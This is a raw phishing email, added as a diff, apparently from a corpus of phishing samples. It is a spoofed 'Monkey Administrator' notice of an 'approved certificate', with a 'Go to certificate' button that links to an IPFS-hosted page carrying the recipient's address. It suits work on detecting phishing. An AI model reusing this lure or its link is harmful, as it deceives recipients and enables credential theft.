@@ -1,0 +1,199 @@
+From jose@monkey.org Wed Apr 12 20:24:20 2023 +0000
+Return-Path: lgomez@bit.com.do
+Delivered-To: jose@monkey.org
+X-FDA: 80673866280.11.7119609
+Received: from 5471867.letsdoitinthecaribbean.com (5471867.letsdoitinthecaribbean.com [162.215.216.45])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP id 3528C160149
+	for <jose@monkey.org>; Wed, 12 Apr 2023 20:24:17 +0000 (UTC)
+Authentication-Results: imf22.b.hostedemail.com;
+	dkim=pass header.d=iconjamaica.com header.s=default header.b=BCdIQwBi;
+	spf=none (imf22.b.hostedemail.com: domain of lgomez@bit.com.do has no SPF policy when checking 162.215.216.45) smtp.mailfrom=lgomez@bit.com.do;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1681331057; a=rsa-sha256;
+	cv=none;
+	b=5uuN8dtkPLe/NQm8Mbi3rPa/In/G8O1cwbfJlxFaM10uIm7oda0hQT8hiV1hSU9cxkEgpc
+	lcQFrFl4U8DeOUYgJpwV9xtuLVB6+KOEGATYmlsen/b/uiRBaLPbuDD+JyzeG7A7Wi1bpz
+	OjMJAOcmP4HLRkMWbKb02GxXDQ1qpu0=
+ARC-Authentication-Results: i=1;
+	imf22.b.hostedemail.com;
+	dkim=pass header.d=iconjamaica.com header.s=default header.b=BCdIQwBi;
+	spf=none (imf22.b.hostedemail.com: domain of lgomez@bit.com.do has no SPF policy when checking 162.215.216.45) smtp.mailfrom=lgomez@bit.com.do;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1681331057;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=RnH5oxYo9D3s/K4MOJoGf87yspGGf28+by5Yxf5OK7k=;
+	b=ZyeKKi1Z9M6S7voq87LXvfy6F5AnMY70VgNwEcId91g3FsnX5yojHbdhjMV/DH29AQ40V+
+	5FWM//S4+wI1qiVgSkmJj4HCd7Bi5iGjU8N7uZIwQCL3VEwn+d/TYn5W1ntZaZngjZbw5k
+	fi4CXu0lniEY6TQ6Sb0UFFTD1W+s6MU=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=iconjamaica.com; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=RnH5oxYo9D3s/K4MOJoGf87yspGGf28+by5Yxf5OK7k=; b=BCdIQwBin/1Wr87RrnjbtRvtwn
+	MV/FFBxHO9kguO94Rkdc/S8g3252Kirt49IEZBORzgXxgv1nJl3B3TZHwgyOPZ53cqFmqi1HN7bv9
+	VZJS3zf1pn960GmmcjOWH80VNHM9NrA7Jw5ApHU+910PJKwmThHmmmcJH5Bndx7FygXG3YPwUPxip
+	M4ctFh4u6ZBnTP2GiwJjQBLOXv/2MPRkIpvY0en5agLaGBVfd4gRaOXybQYc2fwWt8+wZkmSHG73t
+	0p6Y2v2kapGhRdq5eohLsRqc5oNrPiNoW5HZ1fpjDsR/dj7xluxRCD2cQzYD2DwfRrKLA7fVNHQmL
+	iNeIt0aA==;
+Received: from [84.38.135.194] (port=54560 helo=bit.com.do)
+	by 5471867.letsdoitinthecaribbean.com with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96)
+	(envelope-from <lgomez@bit.com.do>)
+	id 1pmh0o-0003Ix-0O
+	for jose@monkey.org;
+	Wed, 12 Apr 2023 15:24:16 -0500
+From: Monkey Administrator  <lgomez@bit.com.do>
+To: jose@monkey.org
+Subject: Attention: Approved Certificate  for jose@monkey.org ref ID:_00Df218t5m._5004P25OlCU:ref
+Date: 12 Apr 2023 23:24:15 +0300
+Message-ID: <20230412232415.9EA56BB869AE09A1@bit.com.do>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="windows-1252"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - 5471867.letsdoitinthecaribbean.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - bit.com.do
+X-Get-Message-Sender-Via: 5471867.letsdoitinthecaribbean.com: authenticated_id: n.pilliner@iconjamaica.com
+X-Authenticated-Sender: 5471867.letsdoitinthecaribbean.com: n.pilliner@iconjamaica.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 3528C160149
+X-Rspam-User: 
+X-Spam-Status: No, score=1.82
+X-Stat-Signature: 19jmpd8uamcyiuqs533eis1r94xc5tb7
+X-HE-Tag: 1681331057-302606
+X-HE-Meta: U2FsdGVkX1+mmHmgqeKJ6f1mXjZnPWNCzTJ4z5tEfaPSYfc7WiFnLmTktlDaUgBoOgDgLXrXW/NcIfZ8bRlQ0GNB8Hw9XsZDbRTOvoPxC6zRI9hrhwL7QhaxOxBgNXgHOAUHKJDvI+0qioHomzlTf+wBFlE3Lf6CFvN/0wM0m3jrVvH/GXw3ILtqueWNFIKPGgQdjlEnYRBGHeWnWBhZKlzaZjgSzbjDwNw3ffraHV8QCKtygxYgetGun6h7PKEntJiGNu3xO7Uj3j37WNqIA6ygSX4Fk9aZyIBIa2CzH9PuQIjldl3/6BotsACzWK6x9+IS/bfcOfaqcpphh9bjs9NxKxJbCXjEnuCJ+Ne+e5bCjVCaGkKchjD8w8YLcIr5CUgj8rjiL75mMfpO/v1Y3H/1hf2uq4AKrlqsLOgkJyF/QrcEk0zvogL4FH610Lpe1tf3xIKw6YimYYo8Qo3hbAEQxIO/eRi+gzX/0ECdSin348PC/9dG79DioYpbXqBN9ur3rLdySXs=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 68
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-1=
+252">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">=20
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge"> </head>=20
+<body>
+<span style=3D"color: rgb(32, 31, 30); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: Calibri, sans-serif, serif, EmojiF=
+ont; font-size: 16px; font-style: normal; font-weight: 400; word-spacing: 0=
+px; float: none; display: inline !important; white-space: normal; orphans: =
+2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;"></span>=20
+<div class=3D"rcmBody">
+<div style=3D'border-width: 0px; margin: 0px 0px 0px 18px; padding: 5px 5px=
+ 5px 0px; border-image: none; width: 477px; color: rgb(32, 31, 30); text-tr=
+ansform: none; text-indent: 0px; letter-spacing: normal; font-family: wf_se=
+goe-ui_semibold, "Segoe UI Semibold", "Segoe WP Semibold", "Segoe UI", "Seg=
+oe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; font-size: 15px; font-=
+style: normal; font-weight: normal; text-decoration: none; word-spacing: 0p=
+x; vertical-align: baseline; float: left;=20
+white-space: normal; font-stretch: inherit; font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; font-variant-nu=
+meric: inherit; font-variant-east-asian: inherit; -webkit-text-size-adjust:=
+ auto;'>
+<div style=3D'border-width: 0px; margin: 0px; padding: 5px 0px 5px 3px; bor=
+der-image: none; font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", T=
+ahoma, Arial, sans-serif, serif, EmojiFont; font-size: 13px; vertical-align=
+: baseline; font-stretch: inherit; background-color: rgb(244, 248, 245); fo=
+nt-variant-ligatures: inherit; font-variant-caps: inherit; font-variant-num=
+eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
+nherit;'>
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; border-image: =
+none; font-family: inherit; vertical-align: baseline; font-stretch: inherit=
+; font-variant-caps: inherit;">Mes<wbr>sage=20
+from Trusted server.</span></div></div>
+<div style=3D'border-width: 0px; margin: 0px; padding: 0px; border-image: n=
+one; color: rgb(32, 31, 30); text-transform: none; text-indent: 0px; letter=
+-spacing: normal; font-family: wf_segoe-ui_semibold, "Segoe UI Semibold", "=
+Segoe WP Semibold", "Segoe UI", "Segoe WP", Tahoma, Arial, sans-serif, seri=
+f, EmojiFont; font-size: 15px; font-style: normal; font-weight: normal; tex=
+t-decoration: none; word-spacing: 0px; vertical-align: baseline; white-spac=
+e: normal; font-stretch: inherit;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; font-variant-numeric: inherit; font-variant-east-asian: inh=
+erit; -webkit-text-size-adjust: auto;'>
+<div style=3D"border-width: 0px; margin: 0px; padding: 2px; border-image: n=
+one; width: 5px; height: 30px; font-family: inherit; vertical-align: baseli=
+ne; font-stretch: inherit; background-color: rgb(86, 166, 89); font-variant=
+-caps: inherit;"></div>
+<div style=3D"border-width: 0px; margin: 0px; padding: 20px; border-image: =
+none; font-family: Calibri, sans-serif, serif, EmojiFont; font-size: 16px; =
+vertical-align: baseline; font-stretch: inherit; font-variant-ligatures: in=
+herit; font-variant-caps: inherit; font-variant-numeric: inherit; font-vari=
+ant-east-asian: inherit; font-variant-alternates: inherit;">
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; border-image: n=
+one; font-family: inherit; vertical-align: baseline; font-stretch: inherit;=
+ font-variant-caps: inherit;"><span>
+<p>&nbsp;</p></span></div></div></div></div>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">=20
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">=20
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">=20
+<div>
+<table style=3D"width: 100%;" border=3D"0">
+  <tbody>
+  <tr>
+    <td style=3D"border-style: hidden hidden solid; width: 100%; border-bot=
+tom-color: rgb(109, 179, 63); border-bottom-width: 1px;"></td></tr></tbody>=
+</table>
+<p> We inform you that the certificate has been approved. You have 1 update=
+ to=20
+complete.<br></p>
+<table style=3D"border-style: hidden; width: 100%;" border=3D"0">
+  <tbody>
+  <tr>
+    <td></td>
+    <td style=3D"border-style: hidden; width: 20%;"> Certificate</td>
+    <td style=3D"border-style: hidden; width: 80%;"> 84700 </td></tr>
+  <tr>
+    <td></td>
+    <td style=3D"border-style: hidden; width: 20%;"></td>
+    <td style=3D"border-style: hidden; width: 80%;"></td></tr>
+  <tr>
+    <td></td>
+    <td style=3D"border-style: hidden; width: 20%;"> Document</td>
+    <td style=3D"border-style: hidden; width: 80%;"> 4620001417 </td></tr>
+  <tr>
+    <td></td>
+    <td style=3D"border-style: hidden; width: 20%;"></td>
+    <td style=3D"border-style: hidden; width: 80%;"></td></tr>
+  <tr>
+    <td></td>
+    <td style=3D"border-style: hidden; width: 20%;"></td>
+    <td style=3D"border-style: hidden; width: 80%;"></td></tr>
+  <tr>
+    <td></td>
+    <td style=3D"border-style: hidden; width: 20%;"></td>
+    <td style=3D"border-style: hidden; width: 80%;"></td></tr></tbody></tab=
+le>
+<table style=3D"width: 100%;" border=3D"0">
+  <tbody>
+  <tr>
+    <td style=3D"border-style: hidden; width: 20%;"></td>
+    <td style=3D"border-style: hidden; width: 20%; text-align: center; back=
+ground-color: rgb(0, 114, 174);"><a href=3D""></a><a style=3D"text-decorati=
+on: none;" href=3D"https://bafybeibzwqnqxwrlfnilrv6ssnbm3p7j2a5ievrjblfm3da=
+htlucofyfgu.ipfs.dweb.link/#jose@monkey.org" target=3D"_blank" rel=3D"noope=
+ner" "=3D""><strong><span style=3D"color: rgb(255, 255, 255);">Go to=20
+      certificate</span></strong></a> </td>
+    <td style=3D"border-style: hidden; width: 60%;"></td></tr></tbody></tab=
+le>
+<p style=3D"font-style: italic;"></p>
+<p> Any questions or queries, please channel it with the applicant.</p>
+<p> This is an automated message sent by the system, please do not reply to=
+=20
+it.</p></div>
+</body></html>
